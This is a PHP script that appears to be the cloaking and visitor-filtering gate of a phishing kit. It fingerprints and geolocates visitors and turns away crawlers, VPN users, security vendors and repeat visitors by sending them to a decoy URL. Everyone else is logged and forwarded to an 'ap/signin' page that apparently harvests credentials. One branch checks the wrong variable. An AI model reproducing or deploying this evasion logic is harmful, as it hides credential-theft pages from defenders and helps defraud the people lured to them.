<?php
require_once "Application/MainFunction.php";
require_once "Helper/MainHelper.php";
require_once 'vendor/autoload.php';

use UAParser\Parser;
use MainFunction\Abstergo;
use MainHelper\CustomBlocker;
use MainHelper\Blocker;

session_start();
$abstergo = new Abstergo();
$parser = Parser::create();

$clientdevice = $parser->parse(get_client_ua());
$parameter = $abstergo->getsetting("parameter");

$clientip = get_client_ip();
$clientua = get_client_ua();
$clientbrowser = $clientdevice->ua->family;
$clientos = $clientdevice->os->toString();
$clientdevices = $clientdevice->device->family;

$clientinfo = $abstergo->extremelookup($clientip);
$clientinfo = json_decode($clientinfo, true);

if ($clientip == "UNKNOWN")
{
    header("Location: " . $abstergo->getsetting("botredirect"));
}

$blacklist = file_get_contents("Resources/Robot/blacklist.dat");
if (preg_match("/" . $clientip . "/i", $blacklist))
{
    $blocked = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|IP Blacklist";
    file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
    header("Location: " . $abstergo->getsetting("botredirect"));
    exit();
}

$whitelist = file_get_contents("Resources/Robot/whitelist.dat");
if (preg_match("/" . $clientip . "/i", $whitelist))
{
    goto direction;
}

if ($abstergo->getsetting("onetime") == true)
{
    $onetime = file_get_contents("Resources/Robot/onetime.dat");
    if (preg_match("/" . $clientip . "/i", $onetime))
    {
        $blocked = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|Onetime Access";
        file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
        header("Location: " . $abstergo->getsetting("botredirect"));
        exit();
    } else {
        file_put_contents("Resources/Robot/onetime.dat", $clientip.PHP_EOL, FILE_APPEND);
    }
}

if (!isset($_GET[$parameter]))
{
    $blocked = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|Wrong Param";
    file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
    header("Location: " . $abstergo->getsetting("botredirect"));
    exit();
}

$mainblocker = new Blocker();

if ($abstergo->getsetting("blockhost") == true)
{
    $hostdetect = $mainblocker->hostnamecheck($clientip, file_get_contents("Resources/Robot/hostname.dat"));

    if ($hostdetect == "blocked")
    {
        $blocked = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|Blocked Hostname";
        file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
        header("Location: " . $abstergo->getsetting("botredirect"));
        exit();
    }
}

if ($abstergo->getsetting("blockrange") == true)
{
    $iprangedetect = $mainblocker->iprangecheck($clientip, file_get_contents("Resources/Robot/iprange.json"));

    if ($iprangedetect == "blocked")
    {
        $blocked = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|Blocked IP Range";
        file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
        header("Location: " . $abstergo->getsetting("botredirect"));
        exit();
    }
}

if ($abstergo->getsetting("blockua") == true)
{

    $uadetect = $mainblocker->uacheck($clientua, file_get_contents("Resources/Robot/useragent.dat"));

    if ($uadetect == "blocked")
    {
        $blocked = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|Blocked Useragent";
        file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
        header("Location: " . $abstergo->getsetting("botredirect"));
        exit();
    }
}

if ($abstergo->getsetting("blockisp") == true)
{

    $ispdetect = $mainblocker->ispcheck($clientinfo["isp"], file_get_contents("Resources/Robot/isp.dat"));

    if ($ispdetect == "blocked")
    {
        $blocked = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|Blocked ISP";
        file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
        header("Location: " . $abstergo->getsetting("botredirect"));
        exit();
    }
}

if ($abstergo->getsetting("blockbase") == true)
{

    $basedetect = $mainblocker->badip($clientip, file_get_contents("Resources/Robot/ip.dat"));
    
    if ($ispdetect == "blocked")
    {
        $blocked = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|Blocked Bad IP";
        file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
        header("Location: " . $abstergo->getsetting("botredirect"));
        exit();
    }
}

if ($abstergo->getsetting("blockcrawler") == true)
{

    $crawlerdetect = $mainblocker->crawler($clientua);

    if ($crawlerdetect == "blocked")
    {
        $blocked = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|Blocked Crawler";
        file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
        header("Location: " . $abstergo->getsetting("botredirect"));
        exit();
    }
}

if ($abstergo->getsetting("blockvpn") == true)
{

    $vpndetect = $mainblocker->isvpn($clientip);

    if ($vpndetect == "blocked")
    {
        $blocked = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|Blocked VPN";
        file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
        header("Location: " . $abstergo->getsetting("botredirect"));
        exit();
    }
}

$customblocker = new CustomBlocker();
$killbotkey = file_get_contents("Resources/Blocker/killbot.ini");
$antibotkey = file_get_contents("Resources/Blocker/antibot.ini");

if (!empty($killbotkey))
{
    $botdetect = $customblocker->killbotapi($killbotkey, $clientip, $clientua);

    if (!empty($botdetect))
    {
        if ($botdetect["data"]["block_access"] == true)
        {
            $blocked = $botdetect["data"]["info"]["ipinfo"]["ip"] . "|" . $botdetect["data"]["info"]["ipinfo"]["country"] . "|" . $botdetect["data"]["info"]["ipinfo"]["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|" . $botdetect["data"]["block_by"];
            file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
            header("Location: " . $abstergo->getsetting("botredirect"));
            exit();
        }
    }
}

if (!empty($antibotkey))
{
    $botdetect = $customblocker->antibotapi($antibotkey, $clientip, $clientua);

    if (!empty($botdetect))
    {
        if ($botdetect["block_access"] == true)
        {
            $blocked = $botdetect["info"]["ipinfo"]["query"] . "|" . $botdetect["info"]["ipinfo"]["countryCode"] . "|" . $botdetect["info"]["ipinfo"]["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|" . $botdetect["block_by"];
            file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
            header("Location: " . $abstergo->getsetting("botredirect"));
            exit();
        }
    }
}

direction:

$_SESSION["client"]["ip"] = $clientip;
$_SESSION["client"]["country"] = $clientinfo["countryCode"];
$_SESSION["client"]["isp"] = $clientinfo["isp"];
$_SESSION["client"]["countryfull"] = $clientinfo["country"];
$_SESSION["client"]["continent"] = $clientinfo["continent"];
$_SESSION["client"]["city"] = $clientinfo["city"];
$_SESSION["client"]["region"] = $clientinfo["region"];
$_SESSION["client"]["lat"] = $clientinfo["lat"];
$_SESSION["client"]["lon"] = $clientinfo["lon"];
$_SESSION["client"]["browser"] = $clientbrowser;
$_SESSION["client"]["os"] = $clientos;
$_SESSION["client"]["device"] = $clientdevices;
$_SESSION["client"]["ua"] = $clientua;
$_SESSION["client"]["allowed"] = true;

$detect = new Mobile_Detect();
$detect->setUserAgent($clientua);
$isMobile = $detect->isMobile();

if ($isMobile == 1)
{
    $_SESSION["client"]["ismobile"] = true;
}

if ($abstergo->getsetting("lockdevice") == "Mobile")
{
    if ($_SESSION["client"]["ismobile"] == true)
    {
        $allowed = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices;
        file_put_contents("Cache/visitor.tmp", $allowed . PHP_EOL, FILE_APPEND);
        $_SESSION["eventid"] = md5(rand(10000000,99999999));
        header("Location: ap/signin?eventid=" . $_SESSION["eventid"]);
        exit();
    } else {
        $blocked = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|Mobile Only";
        file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
        header("Location: " . $abstergo->getsetting("botredirect"));
        exit();
    }
}
elseif ($abstergo->getsetting("lockdevice") == "Desktop") {
    if ($_SESSION["client"]["ismobile"] != true)
    {
        $allowed = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices;
        file_put_contents("Cache/visitor.tmp", $allowed . PHP_EOL, FILE_APPEND);
        $_SESSION["eventid"] = md5(rand(10000000,99999999));
        header("Location: ap/signin?eventid=" . $_SESSION["eventid"]);
        exit();
    } else {
        $blocked = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices . "|Desktop Only";
        file_put_contents("Cache/blocked.tmp", $blocked . PHP_EOL, FILE_APPEND);
        header("Location: " . $abstergo->getsetting("botredirect"));
        exit();
    }
}

$allowed = $clientip . "|" . $clientinfo["countryCode"] . "|" . $clientinfo["isp"] . "|" . $clientbrowser . "|" . $clientdevices;
file_put_contents("Cache/visitor.tmp", $allowed . PHP_EOL, FILE_APPEND);

$_SESSION["eventid"] = md5(rand(10000000,99999999));
header("Location: ap/signin?eventid=" . $_SESSION["eventid"]);
exit();

function get_client_ip()
{
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function get_client_ua()
{
    return $_SERVER['HTTP_USER_AGENT'];
}